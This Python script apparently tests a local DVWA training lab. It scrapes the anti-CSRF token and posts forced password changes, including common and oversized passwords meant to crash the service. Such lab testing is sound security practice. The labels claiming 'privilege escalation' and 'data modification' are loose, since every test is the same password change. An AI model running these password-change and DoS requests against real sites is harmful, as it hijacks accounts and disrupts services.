import requests
from bs4 import BeautifulSoup

def csrf_attack(session, base_url, endpoint, payload):
    response = session.get(base_url + endpoint)
    soup = BeautifulSoup(response.content, 'html.parser')

    if user_token_input := soup.find('input', {'name': 'user_token'}):
        user_token = user_token_input['value'] # type: ignore
        payload['user_token'] = user_token

    response = session.post(base_url + endpoint, data=payload)

    return response

def test_complete_compromise(session, base_url):
    print("Testing for complete compromise...")
    endpoint = 'vulnerabilities/csrf/'
    payload = {'password_new': 'newadminpass', 'password_conf': 'newadminpass', 'Change': 'Change'}
    response = csrf_attack(session, base_url, endpoint, payload)
    
    if "Password Changed" in response.text:
        print("Complete compromise detected. Password was changed.")
    else:
        print("No complete compromise detected.")

def test_gaining_privileges(session, base_url):
    print("Testing for gaining privileges...")
    endpoint = 'vulnerabilities/csrf/'
    payload = {'password_new': 'newuserpass', 'password_conf': 'newuserpass', 'Change': 'Change'}
    response = csrf_attack(session, base_url, endpoint, payload)
    
    if "Password Changed" in response.text:
        print("Privilege escalation detected. Password was changed.")
    else:
        print("No privilege escalation detected.")

def test_bypassing_protection(session, base_url):
    print("Testing for bypassing protection mechanism...")
    endpoint = 'vulnerabilities/csrf/'
    payload = {'password_new': 'bypass123', 'password_conf': 'bypass123', 'Change': 'Change'}
    response = csrf_attack(session, base_url, endpoint, payload)
    
    if "Password Changed" in response.text:
        print("Protection mechanism bypass detected. Password was changed.")
    else:
        print("No protection mechanism bypass detected.")

def test_modifying_data(session, base_url):
    print("Testing for reading or modifying application data...")
    endpoint = 'vulnerabilities/csrf/'
    payload = {'password_new': 'modifydata', 'password_conf': 'modifydata', 'Change': 'Change'}
    response = csrf_attack(session, base_url, endpoint, payload)
    
    if "Password Changed" in response.text:
        print("Data modification detected. Password was changed.")
    else:
        print("No data modification detected.")

def test_dos(session, base_url):
    print("Testing for denial of service (DoS)...")
    endpoint = 'vulnerabilities/csrf/'
    payload = {'password_new': 'a' * 10000, 'password_conf': 'a' * 10000, 'Change': 'Change'}  # Large payload to crash the service
    response = csrf_attack(session, base_url, endpoint, payload)
    
    if response.status_code == 500 or "Service Unavailable" in response.text:
        print("Denial of Service (DoS) detected. Service crashed or became unavailable.")
    else:
        print("No Denial of Service (DoS) detected.")
        
def check_csrfpay(session, base_url):
    csrf_url = base_url + "vulnerabilities/csrf/"
    change_password_url = base_url + "vulnerabilities/csrf/"
    
    try:
        # Navigate to the CSRF page to get the CSRF token
        response = session.get(csrf_url)
        soup = BeautifulSoup(response.content, 'html.parser')
        
        # Attempt to find the user_token input field or other relevant token
        user_token_input = soup.find('input', {'name': 'user_token'})
        
        # Handle case where user_token is not found
        if user_token_input is None:
            print("CSRF token not found as 'user_token'. Attempting alternative token name 'token'.")
            user_token_input = soup.find('input', {'name': 'token'})
            
        # If still not found, skip token usage
        if user_token_input is not None:
            user_token = user_token_input['value'] # type: ignore
        else:
            print("No CSRF token found. Proceeding without token.")
            user_token = None
        
        # Define multiple payloads for testing different CSRF scenarios
        payloads = [
            {'password_new': 'newpassword1', 'password_conf': 'newpassword1', 'Change': 'Change'},
            {'password_new': 'password123', 'password_conf': 'password123', 'Change': 'Change'},
            {'password_new': 'admin123', 'password_conf': 'admin123', 'Change': 'Change'},
            {'password_new': 'P@ssw0rd!', 'password_conf': 'P@ssw0rd!', 'Change': 'Change'},
            {'password_new': '12345678', 'password_conf': '12345678', 'Change': 'Change'},
            {'password_new': 'password', 'password_conf': 'password', 'Change': 'Change'},
            {'password_new': 'qwerty', 'password_conf': 'qwerty', 'Change': 'Change'},
            {'password_new': 'letmein', 'password_conf': 'letmein', 'Change': 'Change'},
            {'password_new': 'aaaaaaaa', 'password_conf': 'aaaaaaaa', 'Change': 'Change'},
            {'password_new': 'short', 'password_conf': 'short', 'Change': 'Change'},
            {'password_new': 'a'*100, 'password_conf': 'a'*100, 'Change': 'Change'}
        ]
        
        if user_token:
            for payload in payloads:
                payload['user_token'] = user_token # type: ignore
        
        # Perform the CSRF attack with each payload
        for i, payload in enumerate(payloads):
            print(f"Testing payload {i+1}")
            response = session.post(change_password_url, data=payload)
            
            if "Password Changed" in response.text:
                print(f"CSRF vulnerability detected with payload {i+1}. Password was changed without user consent.")
            else:
                print(f"CSRF vulnerability not detected with payload {i+1}. Password change failed or required user interaction.")
    
    except Exception as e:
        print(f"An error occurred while testing for CSRF: {e}")

# Example usage
if __name__ == "__main__":
    session = requests.Session()
    base_url = "http://127.0.0.1/DVWA/"  # Adjusted for local DVWA instance
    
    # Ensure the session is logged in and security level is set to low
    from set_security import set_dvwa_security
    if set_dvwa_security(session, base_url, 'low'):
        test_complete_compromise(session, base_url)
        test_gaining_privileges(session, base_url)
        test_bypassing_protection(session, base_url)
        test_modifying_data(session, base_url)
        test_dos(session, base_url)
        check_csrfpay(session, base_url)
